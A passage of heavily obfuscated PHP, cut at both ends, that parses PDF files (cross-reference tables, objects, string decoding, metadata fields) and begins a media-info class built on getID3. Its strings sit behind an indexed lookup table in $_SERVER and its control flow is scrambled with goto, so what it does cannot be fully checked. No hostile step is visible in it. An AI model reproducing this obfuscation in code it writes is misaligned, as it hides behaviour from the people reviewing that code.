˜äáµ[$eä†∏„¡µ±[1537]] = $aÊñÛÒ∑ñÀ[3]; $cÇ˜ ˜äáµ[$eä†∏„¡µ±[1539]] = $aÊñÛÒ∑ñÀ[4]; } goto e∆ÂØ‰Îõå; EÃÛê£–ºÑ: if ($BÜ£≠„·ªù) { $dë≈ØÂéÛØ = $BÜ£≠„·ªù[$eä†∏„¡µ±[1536]][$eä†∏„¡µ±[1195]]; $cÇ˜ ˜äáµ = self::getObjectValue($DìÓÉ—ØŒù, $BÜ£≠„·ªù, $dë≈ØÂéÛØ); } $cÇ˜ ˜äáµ = is_array($cÇ˜ ˜äáµ) ? $cÇ˜ ˜äáµ : array(); $cÇ˜ ˜äáµ[$eä†∏„¡µ±[1537]] = 0; goto bòËÆﬁ”ûŒ; fØÏ¨ëüıç: if ($aÊñÛÒ∑ñÀ) { $cÇ˜ ˜äáµ[$eä†∏„¡µ±[1343]] = $aÊñÛÒ∑ñÀ[1]; } $cÇ˜ ˜äáµ[$eä†∏„¡µ±[1541]] = 0; $F—°ú∞©àÚ = $eä†∏„¡µ±[1542]; goto bà‚£ç£ı≠; Aé•»ñìëã: $DìÓÉ—ØŒù[$eä†∏„¡µ±[1534]] = StreamWrapperIO::read($céõíﬂ‰ﬂ€, 0, $E¿≈äéŒá); $DìÓÉ—ØŒù[$eä†∏„¡µ±[1535]] = StreamWrapperIO::read($céõíﬂ‰ﬂ€, $DìÓÉ—ØŒù[$eä†∏„¡µ±[77]] - $E¿≈äéŒá, $E¿≈äéŒá); $BÜ£≠„·ªù = self::decodeXref($DìÓÉ—ØŒù); goto EÃÛê£–ºÑ; f”‹„—ø£∏: if ($aÊñÛÒ∑ñÀ[1] && $cÇ˜ ˜äáµ[$eä†∏„¡µ±[1541]] < $aÊñÛÒ∑ñÀ[1][0]) { $cÇ˜ ˜äáµ[$eä†∏„¡µ±[1541]] = $aÊñÛÒ∑ñÀ[1][0]; } $cÇ˜ ˜äáµ = self::parseInfoItem($cÇ˜ ˜äáµ); return $cÇ˜ ˜äáµ; goto fµ©ˆæŸ•; B„¢∫‹Ø÷◊: $eä†∏„¡µ± =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $E¿≈äéŒá = 32 * 1024; $DìÓÉ—ØŒù = array($eä†∏„¡µ±[785] => fopen($céõíﬂ‰ﬂ€, $eä†∏„¡µ±[1173]), $eä†∏„¡µ±[75] => $céõíﬂ‰ﬂ€, $eä†∏„¡µ±[77] => filesize($céõíﬂ‰ﬂ€), $eä†∏„¡µ±[1533] => $E¿≈äéŒá); goto Aé•»ñìëã; bà‚£ç£ı≠: preg_match_all($F—°ú∞©àÚ, $DìÓÉ—ØŒù[$eä†∏„¡µ±[1534]], $aÊñÛÒ∑ñÀ); if ($aÊñÛÒ∑ñÀ[1] && $cÇ˜ ˜äáµ[$eä†∏„¡µ±[1541]] < $aÊñÛÒ∑ñÀ[1][0]) { $cÇ˜ ˜äáµ[$eä†∏„¡µ±[1541]] = $aÊñÛÒ∑ñÀ[1][0]; } preg_match_all($F—°ú∞©àÚ, $DìÓÉ—ØŒù[$eä†∏„¡µ±[1535]], $aÊñÛÒ∑ñÀ); goto f”‹„—ø£∏; fµ©ˆæŸ•: } private static function parseInfoItem($eÂﬁ◊Õﬂç·) { $A•ÇªÕ…’« =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$eÂﬁ◊Õﬂç·) { return !1; } $eÿ¶œƒ‘›ß = array($A•ÇªÕ…’«[1344] => array($A•ÇªÕ…’«[1543], $A•ÇªÕ…’«[33]), $A•ÇªÕ…’«[1544] => array($A•ÇªÕ…’«[1545], $A•ÇªÕ…’«[33]), $A•ÇªÕ…’«[187] => array($A•ÇªÕ…’«[1546], $A•ÇªÕ…’«[210]), $A•ÇªÕ…’«[107] => array($A•ÇªÕ…’«[1547], $A•ÇªÕ…’«[210]), $A•ÇªÕ…’«[1541] => array($A•ÇªÕ…’«[1541], $A•ÇªÕ…’«[276]), $A•ÇªÕ…’«[1537] => array($A•ÇªÕ…’«[1537], $A•ÇªÕ…’«[276]), $A•ÇªÕ…’«[1539] => array($A•ÇªÕ…’«[1539], $A•ÇªÕ…’«[276]), $A•ÇªÕ…’«[1548] => array($A•ÇªÕ…’«[1549], $A•ÇªÕ…’«[33]), $A•ÇªÕ…’«[1550] => array($A•ÇªÕ…’«[1551], $A•ÇªÕ…’«[33]), $A•ÇªÕ…’«[1552] => array($A•ÇªÕ…’«[1343], $A•ÇªÕ…’«[33])); $Dàõ∏÷ú—ö = array(); foreach ($eÿ¶œƒ‘›ß as $Fì‡Æﬁ‹ÿŒ => $föâèãéª©) { if (!isset($eÂﬁ◊Õﬂç·[$föâèãéª©[0]])) { continue; } $fÑêÂÛíßá = $eÂﬁ◊Õﬂç·[$föâèãéª©[0]]; if (!$fÑêÂÛíßá || is_array($fÑêÂÛíßá)) { continue; } switch ($föâèãéª©[1]) { case $A•ÇªÕ…’«[276]: $fÑêÂÛíßá = intval($fÑêÂÛíßá); break; case $A•ÇªÕ…’«[210]: if (substr($fÑêÂÛíßá, 0, 2) == $A•ÇªÕ…’«[1553]) { $fÑêÂÛíßá = substr($fÑêÂÛíßá, 2, 14); } if (strtotime($fÑêÂÛíßá)) { $fÑêÂÛíßá = date($A•ÇªÕ…’«[1554], strtotime($fÑêÂÛíßá)); } break; } $Dàõ∏÷ú—ö[$Fì‡Æﬁ‹ÿŒ] = $fÑêÂÛíßá; } return $Dàõ∏÷ú—ö; } private static function decodeXref(&$aíõÇ≤ìäó) { goto a™É»”ã˜«; e¯∫√™¡Ã‹: foreach ($Fã«åÚÕû≈[3] as $bø©≤°Ìﬂù => $a±•û–ø„) { if ($Fã«åÚÕû≈[3][$bø©≤°Ìﬂù] == $dœíö≈∂¥ä[1558]) { $Aº§¬ë†§Ã = $bˆìñ≠Áà≠ . $dœíö≈∂¥ä[70] . intval($Fã«åÚÕû≈[2][$bø©≤°Ìﬂù]); $dà∏ï©”ßë[$dœíö≈∂¥ä[1555]][$Aº§¬ë†§Ã] = intval($Fã«åÚÕû≈[1][$bø©≤°Ìﬂù]); ++$bˆìñ≠Áà≠; } else { if ($Fã«åÚÕû≈[3][$bø©≤°Ìﬂù] == $dœíö≈∂¥ä[1559]) { ++$bˆìñ≠Áà≠; } else { } } } if (preg_match_all($dœíö≈∂¥ä[1560], $Eã‰É∆∂◊–, $Fã«åÚÕû≈)) { $bÁ…°ûÿ·ﬂ = $aíõÇ≤ìäó[$dœíö≈∂¥ä[77]] - $aíõÇ≤ìäó[$dœíö≈∂¥ä[1533]]; foreach ($Fã«åÚÕû≈[0] as $bø©≤°Ìﬂù => $f÷Œ∞©È‰ã) { $eä˘∏á◊¥Î = $Fã«åÚÕû≈[1][$bø©≤°Ìﬂù] . $dœíö≈∂¥ä[70] . $Fã«åÚÕû≈[2][$bø©≤°Ìﬂù]; $dà∏ï©”ßë[$dœíö≈∂¥ä[1555]][$eä˘∏á◊¥Î] = strpos($Eã‰É∆∂◊–, $f÷Œ∞©È‰ã) + $bÁ…°ûÿ·ﬂ + 1; } } if (preg_match_all($dœíö≈∂¥ä[1561], $Eã‰É∆∂◊–, $Fã«åÚÕû≈)) { $CôíÒÎÜÒ‘ = count($Fã«åÚÕû≈[1]) == 1 ? $Fã«åÚÕû≈[1][0] : $Fã«åÚÕû≈[1][1]; } else { $CôíÒÎÜÒ‘ = substr($Eã‰É∆∂◊–, -1024 * 5); } goto DÌº‚§Ôê¿; DÌº‚§Ôê¿: if (preg_match($dœíö≈∂¥ä[1562], $CôíÒÎÜÒ‘, $Fã«åÚÕû≈) > 0) { $dà∏ï©”ßë[$dœíö≈∂¥ä[1536]][$dœíö≈∂¥ä[77]] = intval($Fã«åÚÕû≈[1]); } if (preg_match($dœíö≈∂¥ä[1563], $CôíÒÎÜÒ‘, $Fã«åÚÕû≈) > 0) { $dà∏ï©”ßë[$dœíö≈∂¥ä[1536]][$dœíö≈∂¥ä[1564]] = intval($Fã«åÚÕû≈[1]) . $dœíö≈∂¥ä[70] . intval($Fã«åÚÕû≈[2]); } if (preg_match($dœíö≈∂¥ä[1565], $CôíÒÎÜÒ‘, $Fã«åÚÕû≈) > 0) { $dà∏ï©”ßë[$dœíö≈∂¥ä[1536]][$dœíö≈∂¥ä[1566]] = intval($Fã«åÚÕû≈[1]) . $dœíö≈∂¥ä[70] . intval($Fã«åÚÕû≈[2]); } goto A∫¬ôæà¥«; A∫¬ôæà¥«: if (preg_match($dœíö≈∂¥ä[1567], $CôíÒÎÜÒ‘, $Fã«åÚÕû≈) > 0) { $dà∏ï©”ßë[$dœíö≈∂¥ä[1536]][$dœíö≈∂¥ä[1195]] = intval($Fã«åÚÕû≈[1]) . $dœíö≈∂¥ä[70] . intval($Fã«åÚÕû≈[2]); } if (preg_match($dœíö≈∂¥ä[1568], $CôíÒÎÜÒ‘, $Fã«åÚÕû≈) > 0) { $dà∏ï©”ßë[$dœíö≈∂¥ä[1536]][$dœíö≈∂¥ä[367]] = array(); $dà∏ï©”ßë[$dœíö≈∂¥ä[1536]][$dœíö≈∂¥ä[367]][0] = $Fã«åÚÕû≈[1]; $dà∏ï©”ßë[$dœíö≈∂¥ä[1536]][$dœíö≈∂¥ä[367]][1] = $Fã«åÚÕû≈[2]; } if (!$dà∏ï©”ßë[$dœíö≈∂¥ä[1536]][$dœíö≈∂¥ä[1195]]) { return !1; } goto fŒ–ãË„Ç¥; fŒ–ãË„Ç¥: if (preg_match($dœíö≈∂¥ä[1569], $CôíÒÎÜÒ‘, $Fã«åÚÕû≈) > 0) { } return $dà∏ï©”ßë; goto B–—ÇÔì¥∆; a™É»”ã˜«: $dœíö≈∂¥ä =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Eã‰É∆∂◊– = $aíõÇ≤ìäó[$dœíö≈∂¥ä[1535]]; $dà∏ï©”ßë = array($dœíö≈∂¥ä[1536] => array(), $dœíö≈∂¥ä[1555] => array()); goto cÖ⁄¥«óÕ◊; aÜ¿œ’ êˆ: if ($aíõÇ≤ìäó[$dœíö≈∂¥ä[77]] - $CØè¡Àéﬂ > $aíõÇ≤ìäó[$dœíö≈∂¥ä[1533]]) { $AÿÂÛë£Ïÿ = 4 * $aíõÇ≤ìäó[$dœíö≈∂¥ä[1533]]; $aíõÇ≤ìäó[$dœíö≈∂¥ä[1533]] = $AÿÂÛë£Ïÿ; $aíõÇ≤ìäó[$dœíö≈∂¥ä[1534]] = StreamWrapperIO::read($aíõÇ≤ìäó[$dœíö≈∂¥ä[75]], 0, $AÿÂÛë£Ïÿ); $aíõÇ≤ìäó[$dœíö≈∂¥ä[1535]] = StreamWrapperIO::read($aíõÇ≤ìäó[$dœíö≈∂¥ä[75]], $aíõÇ≤ìäó[$dœíö≈∂¥ä[77]] - $AÿÂÛë£Ïÿ, $AÿÂÛë£Ïÿ); $Eã‰É∆∂◊– = $aíõÇ≤ìäó[$dœíö≈∂¥ä[1535]]; } $bˆìñ≠Áà≠ = 0; preg_match_all($dœíö≈∂¥ä[1557], $Eã‰É∆∂◊–, $Fã«åÚÕû≈); goto e¯∫√™¡Ã‹; cÖ⁄¥«óÕ◊: $d©Öœ≥í·ï = $dœíö≈∂¥ä[1556]; if (!preg_match_all($d©Öœ≥í·ï, $Eã‰É∆∂◊–, $Fã«åÚÕû≈, PREG_SET_ORDER, 0)) { return !1; } $CØè¡Àéﬂ = intval($Fã«åÚÕû≈[0][1]); goto aÜ¿œ’ êˆ; B–—ÇÔì¥∆: } private static function getObjectValue($f¿›≠À¿⁄Í, $Eç‹≠¥ÌπÌ, $A˘°è÷ÑÑ¶) { goto eÌ≤àçﬁå†; eÌ≤àçﬁå†: $Dêâí¶´ç© =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $FŸÌû¨›ê√ = self::getObject($f¿›≠À¿⁄Í, $Eç‹≠¥ÌπÌ[$Dêâí¶´ç©[1555]][$A˘°è÷ÑÑ¶]); if (is_string($FŸÌû¨›ê√[1])) { return $FŸÌû¨›ê√[1]; } goto bÌ—∑ªŸÛù; EìÏ’¨â√É: return $d»´ê§—◊ö; goto EÖ’ÇÈùÂ ; bÌ—∑ªŸÛù: if (!is_array($FŸÌû¨›ê√[1])) { return array(); } $d»´ê§—◊ö = array(); for ($cﬂäÓÜÑ±ì = 0; $cﬂäÓÜÑ±ì < count($FŸÌû¨›ê√[1]); $cﬂäÓÜÑ±ì += 2) { $Aü£∑ÜﬁìÃ = $FŸÌû¨›ê√[1][$cﬂäÓÜÑ±ì]; $Aòä¢·Ì“ì = $FŸÌû¨›ê√[1][$cﬂäÓÜÑ±ì + 1]; if (count($Aü£∑ÜﬁìÃ) == 3 && $Aü£∑ÜﬁìÃ[0] == $Dêâí¶´ç©[8]) { $bƒú⁄ˆØì‰ = !1; if ($Aòä¢·Ì“ì[0] == $Dêâí¶´ç©[1570]) { $Aòä¢·Ì“ì = self::getObject($f¿›≠À¿⁄Í, $Eç‹≠¥ÌπÌ[$Dêâí¶´ç©[1555]][$Aòä¢·Ì“ì[1]]); } $bƒú⁄ˆØì‰ = $Aòä¢·Ì“ì[1]; if ($bƒú⁄ˆØì‰ === !1) { continue; } if (is_string($bƒú⁄ˆØì‰)) { $bƒú⁄ˆØì‰ = self::decodeStr($bƒú⁄ˆØì‰); } $d»´ê§—◊ö[$Aü£∑ÜﬁìÃ[1]] = $bƒú⁄ˆØì‰; } } goto EìÏ’¨â√É; EÖ’ÇÈùÂ : } private static function getObject($EÚêä⁄â‚Ã, $b·Íâüá±) { $b±»ó¿‘∂◊ = self::getObjectItem($EÚêä⁄â‚Ã, $b·Íâüá±); $b±»ó¿‘∂◊ = self::getObjectItem($EÚêä⁄â‚Ã, $b±»ó¿‘∂◊[2]); return $b±»ó¿‘∂◊; } private static function getObjectItem($Bæ◊ÂÙÈ∂¥, $e„…¿›ÜÑî) { goto a›◊ªùÏ¶ä; f¢·Èõñ—: $cÜ…›‰‚òó = $e„…¿›ÜÑî >= $DôóœÙÔﬁŸ ? $e„…¿›ÜÑî - $DôóœÙÔﬁŸ : $e„…¿›ÜÑî; $b∏Ω°⁄îáè = $e„…¿›ÜÑî >= $DôóœÙÔﬁŸ ? $Bæ◊ÂÙÈ∂¥[$fâ¯Öï∞Ì≠[1535]] : $Bæ◊ÂÙÈ∂¥[$fâ¯Öï∞Ì≠[1534]]; if ($e„…¿›ÜÑî > $b°πª⁄Ë˘Ø && $e„…¿›ÜÑî <= $DôóœÙÔﬁŸ) { $cÜ…›‰‚òó = 0; $b∏Ω°⁄îáè = StreamWrapperIO::read($Bæ◊ÂÙÈ∂¥[$fâ¯Öï∞Ì≠[75]], $e„…¿›ÜÑî, $b°πª⁄Ë˘Ø); } goto cÊç‰†∆Ì˜; cÊç‰†∆Ì˜: $FÃûæ€¶î¬ = self::getRawObject($b∏Ω°⁄îáè, $cÜ…›‰‚òó); if ($e„…¿›ÜÑî >= $DôóœÙÔﬁŸ) { $FÃûæ€¶î¬[2] = $FÃûæ€¶î¬[2] + $DôóœÙÔﬁŸ; } else { if ($e„…¿›ÜÑî > $b°πª⁄Ë˘Ø && $e„…¿›ÜÑî <= $DôóœÙÔﬁŸ) { $FÃûæ€¶î¬[2] = $FÃûæ€¶î¬[2] + $e„…¿›ÜÑî; } } return $FÃûæ€¶î¬; goto cÑñÖ”’éü; a›◊ªùÏ¶ä: $fâ¯Öï∞Ì≠ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $b°πª⁄Ë˘Ø = $Bæ◊ÂÙÈ∂¥[$fâ¯Öï∞Ì≠[1533]]; $DôóœÙÔﬁŸ = $Bæ◊ÂÙÈ∂¥[$fâ¯Öï∞Ì≠[77]] - $b°πª⁄Ë˘Ø; goto f¢·Èõñ—; cÑñÖ”’éü: } private static function decodeStr($aáÀ∫’∏è≥) { goto AÚËñÒÕ©°; D≈ÇîÚñÌ°: return $aáÀ∫’∏è≥; goto fÇ∫⁄∆ﬂ¬≤; dîíéÖØÁ‡: $aáÀ∫’∏è≥ = $e‘ØÂ›Úä≥[33]; foreach ($c»™Ëàû Ø as $Eı≈ï∆Èê¿) { if (preg_match($e‘ØÂ›Úä≥[1580], $Eı≈ï∆Èê¿)) { $aáÀ∫’∏è≥ .= \chr(octdec(trim($Eı≈ï∆Èê¿, $e‘ØÂ›Úä≥[93]))); } else { $aáÀ∫’∏è≥ .= $Eı≈ï∆Èê¿; } } $c»™Ëàû Ø = preg_split($e‘ØÂ›Úä≥[1581], $aáÀ∫’∏è≥, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto EÒ∞¡ëÒ∫ü; EÒ∞¡ëÒ∫ü: $aáÀ∫’∏è≥ = $e‘ØÂ›Úä≥[33]; foreach ($c»™Ëàû Ø as $Eı≈ï∆Èê¿) { if (preg_match($e‘ØÂ›Úä≥[1582], $Eı≈ï∆Èê¿)) { $aáÀ∫’∏è≥ .= \chr(hexdec(trim($Eı≈ï∆Èê¿, $e‘ØÂ›Úä≥[1583]))); } else { $aáÀ∫’∏è≥ .= $Eı≈ï∆Èê¿; } } $c»™Ëàû Ø = preg_split($e‘ØÂ›Úä≥[1584], $aáÀ∫’∏è≥, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto BÏ«’√ΩµÇ; BÏ«’√ΩµÇ: $aáÀ∫’∏è≥ = $e‘ØÂ›Úä≥[33]; foreach ($c»™Ëàû Ø as $Eı≈ï∆Èê¿) { if (preg_match($e‘ØÂ›Úä≥[1585], $Eı≈ï∆Èê¿) && !1 === stripos($Eı≈ï∆Èê¿, $e‘ØÂ›Úä≥[1586])) { $Eı≈ï∆Èê¿ = preg_replace($e‘ØÂ›Úä≥[1587], $e‘ØÂ›Úä≥[33], $Eı≈ï∆Èê¿); $Eı≈ï∆Èê¿ = trim($Eı≈ï∆Èê¿, $e‘ØÂ›Úä≥[930]); $Eı≈ï∆Èê¿ = pack($e‘ØÂ›Úä≥[1588], $Eı≈ï∆Èê¿); $aáÀ∫’∏è≥ .= $Eı≈ï∆Èê¿; } else { $aáÀ∫’∏è≥ .= $Eı≈ï∆Èê¿; } } if (preg_match($e‘ØÂ›Úä≥[1589], $aáÀ∫’∏è≥)) { $bÕ∞Üë¬ä‘ = substr($aáÀ∫’∏è≥, 2); $aáÀ∫’∏è≥ = $e‘ØÂ›Úä≥[33]; $fÍ¨ˆ›éœÔ = strlen($bÕ∞Üë¬ä‘); for ($eÏß«œΩå° = 0; $eÏß«œΩå° < $fÍ¨ˆ›éœÔ; $eÏß«œΩå° += 2) { $aﬂŒé©ÓÌœ = hexdec(bin2hex(substr($bÕ∞Üë¬ä‘, $eÏß«œΩå°, 2))); $aáÀ∫’∏è≥ .= mb_convert_encoding($e‘ØÂ›Úä≥[1590] . intval($aﬂŒé©ÓÌœ) . $e‘ØÂ›Úä≥[67], $e‘ØÂ›Úä≥[1591], $e‘ØÂ›Úä≥[1592]); } } goto D≈ÇîÚñÌ°; AÚËñÒÕ©°: $e‘ØÂ›Úä≥ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $aáÀ∫’∏è≥ = str_replace(array($e‘ØÂ›Úä≥[1571], $e‘ØÂ›Úä≥[1572], $e‘ØÂ›Úä≥[1573], $e‘ØÂ›Úä≥[1574], $e‘ØÂ›Úä≥[1575], $e‘ØÂ›Úä≥[1576], $e‘ØÂ›Úä≥[1577], $e‘ØÂ›Úä≥[1578]), array($e‘ØÂ›Úä≥[93], $e‘ØÂ›Úä≥[50], $e‘ØÂ›Úä≥[8], $e‘ØÂ›Úä≥[248], $e‘ØÂ›Úä≥[821], $e‘ØÂ›Úä≥[217], $e‘ØÂ›Úä≥[996], $e‘ØÂ›Úä≥[330]), $aáÀ∫’∏è≥); $c»™Ëàû Ø = preg_split($e‘ØÂ›Úä≥[1579], $aáÀ∫’∏è≥, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto dîíéÖØÁ‡; fÇ∫⁄∆ﬂ¬≤: } private static function getRawObject($BØåÂèÖá–, $DäΩÌ‰à∆± = 0) { goto E÷à∑£™ª¨; aÆ„†õÑêõ: $DäΩÌ‰à∆± += strspn($BØåÂèÖá–, $EÑú÷® ≠»[1593], $DäΩÌ‰à∆±); $Fû∫•˘Ÿíª = $BØåÂèÖá–[$DäΩÌ‰à∆±]; switch ($Fû∫•˘Ÿíª) { case $EÑú÷® ≠»[1594]: $C◊çº«ã´Ë = strcspn($BØåÂèÖá–, $EÑú÷® ≠»[1595], $DäΩÌ‰à∆±); if ($C◊çº«ã´Ë > 0) { $DäΩÌ‰à∆± += $C◊çº«ã´Ë; return self::getRawObject($BØåÂèÖá–, $DäΩÌ‰à∆±); } break; case $EÑú÷® ≠»[8]: $fñçê€ÏÖÃ = $Fû∫•˘Ÿíª; ++$DäΩÌ‰à∆±; $fÈË€è›ÒÕ = preg_match($EÑú÷® ≠»[1596], substr($BØåÂèÖá–, $DäΩÌ‰à∆±, 256), $a∞¿ÙïÓº¥); if (1 == $fÈË€è›ÒÕ) { $bê«È¶Á˜ñ = $a∞¿ÙïÓº¥[1]; $DäΩÌ‰à∆± += strlen($bê«È¶Á˜ñ); } break; case $EÑú÷® ≠»[248]: case $EÑú÷® ≠»[821]: $fñçê€ÏÖÃ = $Fû∫•˘Ÿíª; ++$DäΩÌ‰à∆±; $AÜäˆ¶¡‰° = $DäΩÌ‰à∆±; if ($EÑú÷® ≠»[248] == $Fû∫•˘Ÿíª) { $B´æ‹¶óêË = 1; while ($B´æ‹¶óêË > 0) { if (!isset($BØåÂèÖá–[$AÜäˆ¶¡‰°])) { break; } $aò∂‹‹ıö∂ = $BØåÂèÖá–[$AÜäˆ¶¡‰°]; switch ($aò∂‹‹ıö∂) { case $EÑú÷® ≠»[93]: ++$AÜäˆ¶¡‰°; break; case $EÑú÷® ≠»[248]: ++$B´æ‹¶óêË; break; case $EÑú÷® ≠»[821]: --$B´æ‹¶óêË; break; } ++$AÜäˆ¶¡‰°; } $bê«È¶Á˜ñ = substr($BØåÂèÖá–, $DäΩÌ‰à∆±, $AÜäˆ¶¡‰° - $DäΩÌ‰à∆± - 1); $DäΩÌ‰à∆± = $AÜäˆ¶¡‰°; } break; case $EÑú÷® ≠»[157]: case $EÑú÷® ≠»[476]: $fñçê€ÏÖÃ = $Fû∫•˘Ÿíª; ++$DäΩÌ‰à∆±; if ($EÑú÷® ≠»[157] == $Fû∫•˘Ÿíª) { $bê«È¶Á˜ñ = array(); do { $cÑ¿µ´ÿ«“ = $DäΩÌ‰à∆±; $eÍÑÒ¨∂¿† = self::getRawObject($BØåÂèÖá–, $DäΩÌ‰à∆±); $DäΩÌ‰à∆± = $eÍÑÒ¨∂¿†[2]; $bê«È¶Á˜ñ[] = $eÍÑÒ¨∂¿†; } while ($EÑú÷® ≠»[476] != $eÍÑÒ¨∂¿†[0] && $DäΩÌ‰à∆± != $cÑ¿µ´ÿ«“); array_pop($bê«È¶Á˜ñ); } break; case $EÑú÷® ≠»[929]: case $EÑú÷® ≠»[932]: if (isset($BØåÂèÖá–[$DäΩÌ‰à∆± + 1]) && $BØåÂèÖá–[$DäΩÌ‰à∆± + 1] == $Fû∫•˘Ÿíª) { $fñçê€ÏÖÃ = $Fû∫•˘Ÿíª . $Fû∫•˘Ÿíª; $DäΩÌ‰à∆± += 2; if ($EÑú÷® ≠»[929] == $Fû∫•˘Ÿíª) { $bê«È¶Á˜ñ = array(); do { $cÑ¿µ´ÿ«“ = $DäΩÌ‰à∆±; $eÍÑÒ¨∂¿† = self::getRawObject($BØåÂèÖá–, $DäΩÌ‰à∆±); $DäΩÌ‰à∆± = $eÍÑÒ¨∂¿†[2]; $bê«È¶Á˜ñ[] = $eÍÑÒ¨∂¿†; } while ($EÑú÷® ≠»[1597] != $eÍÑÒ¨∂¿†[0] && $DäΩÌ‰à∆± != $cÑ¿µ´ÿ«“); array_pop($bê«È¶Á˜ñ); } } else { $fñçê€ÏÖÃ = $Fû∫•˘Ÿíª; ++$DäΩÌ‰à∆±; $fÈË€è›ÒÕ = preg_match($EÑú÷® ≠»[1598], substr($BØåÂèÖá–, $DäΩÌ‰à∆±), $a∞¿ÙïÓº¥); if ($EÑú÷® ≠»[929] == $Fû∫•˘Ÿíª && 1 == $fÈË€è›ÒÕ) { $bê«È¶Á˜ñ = strtr($a∞¿ÙïÓº¥[1], $EÑú÷® ≠»[1599], $EÑú÷® ≠»[33]); $DäΩÌ‰à∆± += \strlen($a∞¿ÙïÓº¥[0]); } elseif (!1 !== ($FÖç¥Ê“áø = strpos($BØåÂèÖá–, $EÑú÷® ≠»[932], $DäΩÌ‰à∆±))) { $DäΩÌ‰à∆± = $FÖç¥Ê“áø + 1; } } break; default: if ($EÑú÷® ≠»[1600] == substr($BØåÂèÖá–, $DäΩÌ‰à∆±, 6)) { $fñçê€ÏÖÃ = $EÑú÷® ≠»[1600]; $DäΩÌ‰à∆± += 6; } elseif ($EÑú÷® ≠»[99] == substr($BØåÂèÖá–, $DäΩÌ‰à∆±, 4)) { $fñçê€ÏÖÃ = $EÑú÷® ≠»[99]; $DäΩÌ‰à∆± += 4; $bê«È¶Á˜ñ = $EÑú÷® ≠»[99]; } elseif ($EÑú÷® ≠»[1601] == substr($BØåÂèÖá–, $DäΩÌ‰à∆±, 4)) { $fñçê€ÏÖÃ = $EÑú÷® ≠»[1602]; $DäΩÌ‰à∆± += 4; $bê«È¶Á˜ñ = $EÑú÷® ≠»[1601]; } elseif ($EÑú÷® ≠»[1603] == substr($BØåÂèÖá–, $DäΩÌ‰à∆±, 5)) { $fñçê€ÏÖÃ = $EÑú÷® ≠»[1602]; $DäΩÌ‰à∆± += 5; $bê«È¶Á˜ñ = $EÑú÷® ≠»[1603]; } elseif ($EÑú÷® ≠»[1604] == substr($BØåÂèÖá–, $DäΩÌ‰à∆±, 6)) { $fñçê€ÏÖÃ = $EÑú÷® ≠»[1604]; $DäΩÌ‰à∆± += 6; if (1 == preg_match($EÑú÷® ≠»[1605], substr($BØåÂèÖá–, $DäΩÌ‰à∆±), $a∞¿ÙïÓº¥)) { $DäΩÌ‰à∆± += strlen($a∞¿ÙïÓº¥[0]); $E∆∂áêô®Õ = $EÑú÷® ≠»[1606]; $fÈË€è›ÒÕ = preg_match($E∆∂áêô®Õ, substr($BØåÂèÖá–, $DäΩÌ‰à∆±), $a∞¿ÙïÓº¥, PREG_OFFSET_CAPTURE); if (1 == $fÈË€è›ÒÕ) { $bê«È¶Á˜ñ = substr($BØåÂèÖá–, $DäΩÌ‰à∆±, $a∞¿ÙïÓº¥[0][1]); $DäΩÌ‰à∆± += $a∞¿ÙïÓº¥[1][1]; } } } elseif ($EÑú÷® ≠»[1607] == substr($BØåÂèÖá–, $DäΩÌ‰à∆±, 9)) { $fñçê€ÏÖÃ = $EÑú÷® ≠»[1607]; $DäΩÌ‰à∆± += 9; } elseif (1 == preg_match($EÑú÷® ≠»[1608], substr($BØåÂèÖá–, $DäΩÌ‰à∆±, 33), $a∞¿ÙïÓº¥)) { $fñçê€ÏÖÃ = $EÑú÷® ≠»[1570]; $DäΩÌ‰à∆± += strlen($a∞¿ÙïÓº¥[0]); $bê«È¶Á˜ñ = intval($a∞¿ÙïÓº¥[1]) . $EÑú÷® ≠»[70] . intval($a∞¿ÙïÓº¥[2]); } elseif (1 == preg_match($EÑú÷® ≠»[1609], substr($BØåÂèÖá–, $DäΩÌ‰à∆±, 33), $a∞¿ÙïÓº¥)) { $fñçê€ÏÖÃ = $EÑú÷® ≠»[1610]; $bê«È¶Á˜ñ = intval($a∞¿ÙïÓº¥[1]) . $EÑú÷® ≠»[70] . intval($a∞¿ÙïÓº¥[2]); $DäΩÌ‰à∆± += strlen($a∞¿ÙïÓº¥[0]); } elseif (($A¬”≠·«∏È = strspn($BØåÂèÖá–, $EÑú÷® ≠»[1611], $DäΩÌ‰à∆±)) > 0) { $fñçê€ÏÖÃ = $EÑú÷® ≠»[1612]; $bê«È¶Á˜ñ = substr($BØåÂèÖá–, $DäΩÌ‰à∆±, $A¬”≠·«∏È); $DäΩÌ‰à∆± += $A¬”≠·«∏È; } break; } goto A„“¶€µÑ¨; E÷à∑£™ª¨: $EÑú÷® ≠» =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $fñçê€ÏÖÃ = $EÑú÷® ≠»[33]; $bê«È¶Á˜ñ = $EÑú÷® ≠»[33]; goto aÆ„†õÑêõ; A„“¶€µÑ¨: return array($fñçê€ÏÖÃ, $bê«È¶Á˜ñ, $DäΩÌ‰à∆±); goto c∆ôÊÔÕúÂ; c∆ôÊÔÕúÂ: } } class GetInfo { private static $fileTypeArray; public static function get($Fô‡á§∞é•) { $DÚ•Øç◊”› = IO::info($Fô‡á§∞é•); return self::infoAdd($DÚ•Øç◊”›); } public static function infoAdd(&$CíÌΩÜ—Ã›) { goto DÙ¨úîÔÕ∆; DÙ¨úîÔÕ∆: $DÎ‡Ô›¬¯Ñ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; static $aÌÚ±πçäÖ; if (!$aÌÚ±πçäÖ) { require SDK_DIR . $DÎ‡Ô›¬¯Ñ[1613]; $aÌÚ±πçäÖ = new getID3(); } goto dÖ∂ªÇÜ π; dÖ∂ªÇÜ π: if (!$CíÌΩÜ—Ã› || $CíÌΩÜ—Ã›[$DÎ‡Ô›¬¯Ñ[29]] != $DÎ‡Ô›¬¯Ñ[167]) { return; } if (!self::support($CíÌΩÜ—Ã›[$DÎ‡Ô›¬¯Ñ[160]]) || isset($CíÌΩÜ—Ã›[$DÎ‡Ô›¬¯Ñ[426]])) { return; } $Aó§Ñ§ô‡Ï = 